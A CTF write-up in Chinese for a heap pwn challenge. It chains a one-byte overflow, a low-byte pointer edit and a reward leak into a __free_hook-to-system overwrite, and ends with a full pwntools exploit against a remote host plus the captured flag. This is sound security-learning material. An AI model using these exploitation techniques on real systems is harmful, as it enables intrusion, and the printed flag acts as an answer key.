---
title: "test"
ctf: "ISCC 2026 校赛"
date: 2026-05-01
category: pwn
difficulty: medium
points: 250
flag_format: "ISCC{...}"
author: "OpenAI Codex"
---

# test

## Summary

这题是一道典型的菜单堆题，题目把功能拆成“老师视角”和“学生视角”两套菜单。真正的利用点不在单一 UAF，而是在学生侧 `pray + set mode` 的两条逻辑分支里拼出一个“低字节改指针 + 一次 0x20 定向写”，再结合老师侧大块 `review`、`call parent`、奖励机制中的 heap leak 与任意地址单字节 `+1`，最终完成 libc 泄漏、伪造对象、覆盖 `__free_hook`，通过 `free("/bin/sh")` 拿到 shell 并读取 flag。

这题有两个比较容易卡住的点：

- 业务逻辑比较绕，必须把老师和学生两边的菜单串起来看
- 最后阶段有多种可利用思路，`one_gadget + exit handler` 在远程并不稳定，实际稳定方案是 `__free_hook -> system`

最终 flag：

```text
ISCC{78ee85bf-0c44-4022-bd74-da2e89c9bdf0}
```

## Tools

这次完整解题和脚本修复过程中，实际用到的工具和用途如下：

- `IDA / 反汇编视角`
  用来确认菜单逻辑、结构体布局、隐藏菜单、关键字段偏移。
- `pwntools`
  编写利用脚本、收发菜单、解析泄漏、远程交互。
- `checksec / readelf / file / strings`
  快速确认保护、ELF 属性、字符串线索。
- `gdb / 本地调试`
  配合本地环境理解堆布局和菜单行为。
- 自写 `LD_PRELOAD` tracing so
  hook `malloc/calloc/free/read`，打印堆块地址，帮助确认 chunk 相对位置。
- `WSL`
  本地 Linux 环境跑程序和配套 glibc 2.31。
- `PowerShell`
  Windows 下运行脚本、收集日志、修复路径问题。

题目相关文件：

- 二进制：`attachment-35`
- libc：`attachment-35.so`
- 远程地址：`39.96.193.120:10008`
- 最终利用脚本：[solve.py](/g:/CTF/【CTF】赛事/[20260501]ISCC/ISCC-校赛/PWN/pwn2/solve.py)

## Protection

程序保护如下：

- `Full RELRO`
- `Canary`
- `NX`
- `PIE`

所以常规 GOT 覆盖不能直接走，最后需要把目标放在 libc 内部可写位置，例如 `__free_hook`。

## Program Analysis

### Menu 逻辑

老师菜单：

- `1. add a student`
- `2. give a score`
- `3. write a review`
- `4. call his/her parent`
- `5. change role`

学生菜单：

- `1. do the test`
- `2. check for review`
- `3. pray`
- `4. set mode`
- `5. change role`
- `6. change id`

和利用直接相关的是：

- 老师：`add student`、`write review`、`call parent`
- 学生：`pray`、`set mode`、`check for review`、`change id`

### 堆对象布局

`add student` 会分配两块核心对象：

```c
struct student_info {
    int qnum;
    int score;
    char *review;
    int review_size;
};

struct student_wrap {
    struct student_info *info;
    void *mode_ptr;
    void *unused;
    int prayed;
    int rewarded;
};
```

从菜单行为和 tracing 可以看出：

- `student_wrap` 和 `student_info` 的分配非常规律
- `mode_ptr` 指向单独申请出来的 mode chunk
- `review` 指向老师给某个学生申请的大块评语区

这给后面做“相邻块间定向覆盖”和“伪造对象字段”提供了条件。

## Vulnerability Analysis

### 1. `set mode` 正常分支有 1 字节越界写

学生第一次 `set mode` 时，会给 `mode_ptr` 分配一个 `0x20` 大小的 chunk，然后读入内容。关键点在于程序用的是自定义输入函数，逻辑等价于：

```c
read(fd, buf, 0x20);
buf[0x20] = 0xc3;
```

也就是说除了正常写入 `0x20` 字节，还会在尾部额外写一个字节，形成 1 字节越界写。

这单独看不够强，但已经能改相邻 chunk 的头部或相邻对象的某个低位字段。

### 2. `pray` 后再 `set mode` 可以改 `mode_ptr` 低字节

如果学生先执行 `pray`，再执行 `set mode`，程序会进入另一条分支：

- 不再写字符串
- 改为读一个 `0~100` 的数
- 把这个数写到 `mode_ptr` 的低字节

这就相当于给了我们一个“单字节改指针”的原语。

于是两条分支组合起来以后，可以形成：

1. 先通过 `pray` 分支，修改 `mode_ptr` 的低字节，让它偏到附近别的目标上
2. 再走正常 `set mode` 分支，对这个新地址进行一次 `0x20` 字节写入

这就是这题最核心的利用起点。

### 3. 奖励机制给 heap leak 和任意地址单字节 `+1`

学生 `check for review` 时，如果“分数大于 89”，就会触发奖励：

1. 打印一个堆地址
2. 允许对任意地址做一次单字节 `+1`

这一点非常关键，因为堆题里单字节 `+1` 足够做很多事情：

- 修正 fake chunk 某个关键字节
- 修正 size / inuse / 低位元数据
- 给后续利用补最后一个差 1 的字节

这题里每个学生只能拿一次奖励，所以要安排好谁负责哪次 leak 和哪次修补。

### 4. 评分逻辑和 `pray` 的组合可以“刷出奖励”

利用脚本里有一个 `make_rewardable()`，它会：

1. 切到某个学生
2. 先 `pray`
3. 切回老师评分
4. 一直重刷，直到老师看到的“这一轮分数”落在较小范围

虽然老师菜单看到的是一个正常的小分值，但实际存储逻辑在祈祷路径下存在可被利用的异常效果，最终使得学生检查时能走进奖励分支。因此脚本会不断重刷，直到满足触发奖励的条件。

这一步是题目业务逻辑的坑点之一，解题时很容易在这里误判。

## Exploitation

最终稳定利用链不是最初尝试的 `one_gadget + exit handler`，而是更稳的 `__free_hook -> system`。下面按真实利用过程拆开说。

### Step 1. 先布堆，准备相邻的大块和 mode 区

脚本先创建多名学生，并分别给他们申请不同大小的 review：

- 学生 0：`0xA0`
- 学生 1：`0x3F0`
- 学生 2：`0xA0`
- 学生 3：`0x200`

目的是先把堆布局摆整齐，后面需要：

- 让某些 review chunk 相邻
- 让 mode 区可以通过低字节偏移指向目标对象
- 为后续伪造大 chunk 和 overlapping 准备空间

### Step 2. 拿第一次奖励，得到第一个关键堆地址

脚本对学生 3 执行：

1. `pray`
2. 老师反复 `give score`
3. 满足奖励条件后，学生 3 `check for review`

这样得到第一处 heap leak：

```python
first_chunk = claim_reward(io, 3)
write_addr1 = first_chunk - 0x617
write_addr2 = write_addr1 + 0x110
```

这里的 `first_chunk` 不是最终目标本身，而是一个“对齐锚点”。后面通过两个奖励给出的单字节 `+1`，分别去修补：

- `write_addr1`
- `write_addr2`

它们对应的是 fake chunk 元数据里两个关键字节。

### Step 3. 再布三个大 review，拿第二次奖励补第二个字节

接着再创建学生 4、5、6，并给他们写入三个 `0x300` review。

然后对学生 4 重复同样的“祈祷 -> 刷分 -> 领奖励”流程，得到第二次奖励，把 `write_addr2` 也修好。

到这里为止，fake chunk 所需的几个单字节修正已经补齐，后面就能把某个大块安全地送进 unsorted bin。

### Step 4. 释放伪造大块，借 review 泄漏 `main_arena`

再让学生 0 也变成可领奖励状态，然后：

1. 切回老师
2. `call_parent(io, 1)`，释放学生 1 相关的大 review

因为前面 fake chunk 的关键字节已经被奖励原语修正，这次 free 之后，目标大块会进入 unsorted bin。

随后切回学生 0：

1. 触发奖励，得到另一个堆指针 `chunk`
2. 用奖励原语对 `chunk + 0x40 + 2` 做一次 `+1`
3. 继续读取 review 内容

这时 review 的内容里就能读到 unsorted bin 的链指针，从而泄漏 `main_arena`：

```python
main_arena = u64(io.recv(7).ljust(8, b"\x00")) - 96
libc_base = main_arena - 0x1ECB80
```

随后计算：

```python
LIBC.address = libc_base
free_hook = LIBC.sym["__free_hook"]
system = LIBC.sym["system"]
```

这个地方是最后稳定版脚本里的关键修复点之一：  
一旦 `LIBC.address = libc_base` 设好之后，`LIBC.sym[...]` 就已经是重定位后的真实地址，不能再手动加一次 `libc_base`，否则地址会变成错误的 `0xff...`。

### Step 5. 伪造对象，把“改 review 内容”转成任意地址写

拿到 libc 基址之后，利用老师的 `rewrite review` 功能做最后的对象伪造。

核心 payload 是：

```python
payload = (
    p64(main_arena + 96)
    + p64(main_arena + 96)
    + b"a" * 0x4E0
    + p64(0x500)
    + p64(0x30)
    + p64(first_chunk + 0x30)
    + p64(0) * 2
    + p64(0x0000000100000001)
    + p64(0)
    + p64(0x21)
    + p64(0x0000004800000009)
    + p64(free_hook)
    + p64(0x200)
    + p64(0x201)
    + p64(0xA777777)
)
```

这个 payload 的目的不是简单覆盖字符串，而是伪造出一段可以被后续 `review rewrite` 当成合法对象来使用的内存布局。这样后面某个学生的 `review` 指针就会被导向我们指定的位置，也就是 `__free_hook`。

接下来直接做两次写：

```python
teacher_review(io, 3, p64(system), rewrite=True)
teacher_review(io, 5, b"/bin/sh\x00", rewrite=True)
```

效果分别是：

- 把 `__free_hook` 改成 `system`
- 在另一块将被释放的内存里写入 `/bin/sh`

### Step 6. `free("/bin/sh")` 触发 `system("/bin/sh")`

最后直接：

```python
call_parent(io, 5)
```

`call_parent` 会释放对应学生的结构和 review。因为 `__free_hook` 已经被改成 `system`，所以释放 `/bin/sh\x00` 那块内存时，实际执行的就是：

```c
system("/bin/sh");
```

脚本随后尝试多种方式读 flag：

```python
cat /flag
cat /flag*
cat flag
cat ./flag
```

远程实际输出中，`cat /flag` 不存在，但 `cat /flag*` 成功命中了真实文件：

```text
cat: /flag: No such file or directory
ISCC{78ee85bf-0c44-4022-bd74-da2e89c9bdf0}
```

## 调试过程中的两个真实坑

这道题最后不是“单纯脚本写出来就结束”，而是还有两处运行时 bug 需要修。

### 坑 1. `give_score_all()` 把菜单提示符吃掉了

最开始脚本在第二次刷分时会一直卡住，看起来像服务没响应。  
真实原因是：

```python
data = io.recvuntil(b"choice>> ")
```

把下一轮要用的菜单提示符也读掉了，后面的 `sendlineafter()` 永远等不到这个提示符，于是脚本自锁。

最终修法：

```python
prompt = b"choice>> "
data = io.recvuntil(prompt)
io.unrecv(prompt)
```

把提示符放回缓冲区，后续菜单继续正常跑。

### 坑 2. `__free_hook` / `system` 地址被重复加基址

另一处坑是：

```python
LIBC.address = libc_base
free_hook = libc_base + LIBC.sym["__free_hook"]
system = libc_base + LIBC.sym["system"]
```

这样会把基址加两次。修成：

```python
LIBC.address = libc_base
free_hook = LIBC.sym["__free_hook"]
system = LIBC.sym["system"]
```

之后 `free("/bin/sh")` 才真正跳到 `system("/bin/sh")`。

## 为什么没有继续走 `one_gadget + exit handler`

在中间调试阶段，一度尝试过另一条链：

- 泄漏 libc
- 改 glibc 的 exit handler 区域
- 走隐藏菜单 `6`
- 触发 `exit(-1)` 落到 `one_gadget`

这条链本地逻辑是通的，但远程表现不稳定，通常会在进入交互后直接 EOF，shell 不稳定，读 flag 不可靠。

因此最终切换到更稳定的方案：

- `__free_hook = system`
- 释放 `/bin/sh`

这条链远程稳定得多，也更容易自动化打印 flag。

## Final Exploit

下面是最终稳定版利用脚本，对应仓库中的 [solve.py](/g:/CTF/【CTF】赛事/[20260501]ISCC/ISCC-校赛/PWN/pwn2/solve.py)：

```python
import re
from pathlib import Path
from pwn import *


BASE_DIR = Path(__file__).resolve().parent
BIN_PATH = BASE_DIR / "attachment-35"
LIBC_PATH = BASE_DIR / "attachment-35.so"

context.binary = ELF(str(BIN_PATH), checksec=False)
LIBC = ELF(str(LIBC_PATH), checksec=False)
context.arch = "amd64"
context.log_level = "info"

HOST = "39.96.193.120"
PORT = 10008


def start():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(
        ["wsl.exe", "bash", "-lc", "cd /mnt/c/ctf_tmp/pwn2 && LD_PRELOAD=./libc.so.6 ./chall"]
    )


def sl_after(io, delim, data):
    io.sendlineafter(delim, data if isinstance(data, bytes) else str(data).encode())


def s_after(io, delim, data):
    io.sendafter(delim, data if isinstance(data, bytes) else str(data).encode())


def choice(io, idx):
    sl_after(io, b"choice>> ", idx)


def change_role(io, role):
    choice(io, 5)
    sl_after(io, b"role: <0.teacher/1.student>: ", role)


def add_student(io, qnum):
    choice(io, 1)
    sl_after(io, b"enter the number of questions: ", qnum)


def give_score_all(io):
    choice(io, 2)
    prompt = b"choice>> "
    data = io.recvuntil(prompt)
    io.unrecv(prompt)
    pairs = re.findall(rb"score for the (\d+)th student is (-?\d+)", data)
    return {int(i): int(v) for i, v in pairs}


def call_parent(io, idx):
    choice(io, 4)
    sl_after(io, b"which student id to choose?", idx)


def pray(io):
    choice(io, 3)


def change_id(io, idx):
    choice(io, 6)
    sl_after(io, b"input your id: ", idx)


def teacher_review(io, idx, payload, size=0x18, rewrite=False):
    choice(io, 3)
    sl_after(io, b"which one? > ", idx)
    if rewrite:
        s_after(io, b"enter your comment:", payload)
    else:
        sl_after(io, b"please input the size of comment: ", size)
        s_after(io, b"enter your comment:", payload)


def set_mode(io, payload=None, pray_score=None):
    choice(io, 4)
    if pray_score is None:
        s_after(io, b"enter your mode!", payload)
    else:
        sl_after(io, b"enter your pray score: 0 to 100", pray_score)


def p32u(x):
    return p32(x & 0xFFFFFFFF)


def make_rewardable(io, idx):
    change_role(io, 1)
    change_id(io, idx)
    pray(io)
    change_role(io, 0)
    value = give_score_all(io)[idx]
    while value >= 10:
        value = give_score_all(io)[idx]
    return value


def claim_reward(io, idx):
    change_role(io, 1)
    change_id(io, idx)
    choice(io, 2)
    io.recvuntil(b"Good Job! Here is your reward! ")
    leak = int(io.recvline().strip(), 16)
    io.recvuntil(b"addr: ")
    return leak


def reward_add1(io, addr):
    io.sendline((str(addr) + "1").encode())


def show_flag(io):
    cmds = [
        b"cat /flag",
        b"cat /flag*",
        b"cat flag",
        b"cat ./flag",
        b"find / -maxdepth 2 -name 'flag*' 2>/dev/null | head -n 5",
    ]
    for cmd in cmds:
        io.sendline(cmd)
        data = io.recvrepeat(0.8)
        if data:
            try:
                print(data.decode("latin-1", errors="ignore"), end="")
            except Exception:
                print(repr(data))
        if b"ISCC{" in data:
            return True
    return False


def exploit(io):
    sl_after(io, b"role: <0.teacher/1.student>: ", 0)

    add_student(io, 9)
    teacher_review(io, 0, b"wsxk", 0xA0)
    add_student(io, 9)
    teacher_review(io, 1, b"test", 0x3F0)
    add_student(io, 9)
    teacher_review(io, 2, b"www", 0xA0)
    add_student(io, 9)
    teacher_review(io, 3, b"www", 0x200)

    make_rewardable(io, 3)
    first_chunk = claim_reward(io, 3)
    write_addr1 = first_chunk - 0x617
    write_addr2 = write_addr1 + 0x110
    reward_add1(io, write_addr1)

    change_role(io, 0)
    add_student(io, 9)
    teacher_review(io, 4, b"wsxk", 0x300)
    add_student(io, 9)
    teacher_review(io, 5, b"wsxk", 0x300)
    add_student(io, 9)
    teacher_review(io, 6, b"wwww", 0x300)

    make_rewardable(io, 4)
    claim_reward(io, 4)
    reward_add1(io, write_addr2)

    make_rewardable(io, 0)
    change_role(io, 0)
    call_parent(io, 1)

    change_role(io, 1)
    change_id(io, 0)
    choice(io, 2)
    io.recvuntil(b"Good Job! Here is your reward! ")
    chunk = int(io.recvline().strip(), 16)
    io.recvuntil(b"addr: ")
    reward_add1(io, chunk + 0x40 + 2)
    io.recvuntil(b"here is the review:\n")
    main_arena = u64(io.recv(7).ljust(8, b"\x00")) - 96
    libc_base = main_arena - 0x1ECB80
    LIBC.address = libc_base
    free_hook = LIBC.sym["__free_hook"]
    system = LIBC.sym["system"]

    change_role(io, 0)
    payload = (
        p64(main_arena + 96)
        + p64(main_arena + 96)
        + b"a" * 0x4E0
        + p64(0x500)
        + p64(0x30)
        + p64(first_chunk + 0x30)
        + p64(0) * 2
        + p64(0x0000000100000001)
        + p64(0)
        + p64(0x21)
        + p64(0x0000004800000009)
        + p64(free_hook)
        + p64(0x200)
        + p64(0x201)
        + p64(0xA777777)
    )
    teacher_review(io, 0, payload, rewrite=True)
    teacher_review(io, 3, p64(system), rewrite=True)
    teacher_review(io, 5, b"/bin/sh\x00", rewrite=True)
    call_parent(io, 5)

    sleep(1)
    show_flag(io)
    io.interactive()


if __name__ == "__main__":
    io = start()
    exploit(io)
```

## 实际远程结果

稳定版脚本远程运行时，核心输出类似：

```text
[+] main_arena = 0x7f2ca4f7ab80
[+] libc_base = 0x7f2ca4d8e000
[+] __free_hook = 0x7f2ca4f7ce48
[+] system = 0x7f2ca4de0290
cat: /flag: No such file or directory
ISCC{78ee85bf-0c44-4022-bd74-da2e89c9bdf0}
```

## Lessons Learned

这题最值得总结的地方有三点：

1. 菜单堆题很多时候不是“找到一个大漏洞”，而是把多个很弱的小原语拼成完整利用链。
2. 奖励类逻辑、角色切换、评分刷新这类业务代码，往往比传统 `malloc/free` 菜单更容易藏关键漏洞。
3. exp 写完不代表结束，真正远程稳定跑通时，I/O 同步和符号地址处理这类“小 bug”同样会决定最后是否能拿到 flag。

## Flag

```text
ISCC{78ee85bf-0c44-4022-bd74-da2e89c9bdf0}
```
